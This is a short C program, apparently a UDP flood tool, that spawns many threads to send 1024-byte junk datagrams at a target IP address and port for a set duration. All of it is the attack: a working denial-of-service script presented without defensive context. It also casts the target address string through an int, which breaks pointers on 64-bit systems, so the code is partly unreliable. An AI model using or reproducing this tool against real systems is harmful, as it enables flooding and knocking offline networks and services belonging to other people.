#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

void* attack(void* arg) {
    int *p = (int*)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in addr;
    char buf[1024];
    memset(buf, 'A', 1024);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(p[1]);
    addr.sin_addr.s_addr = inet_addr((char*)p[0]);
    
    time_t end = time(NULL) + p[2];
    while(time(NULL) < end) {
        sendto(sock, buf, 1024, 0, (struct sockaddr*)&addr, sizeof(addr));
    }
    close(sock);
    return NULL;
}

int main(int argc, char* argv[]) {
    int data[3] = { (int)argv[1], atoi(argv[2]), atoi(argv[3]) };
    int threads = atoi(argv[4]);
    pthread_t t[threads];
    for(int i = 0; i < threads; i++) pthread_create(&t[i], NULL, attack, data);
    for(int i = 0; i < threads; i++) pthread_join(t[i], NULL);
    return 0;
}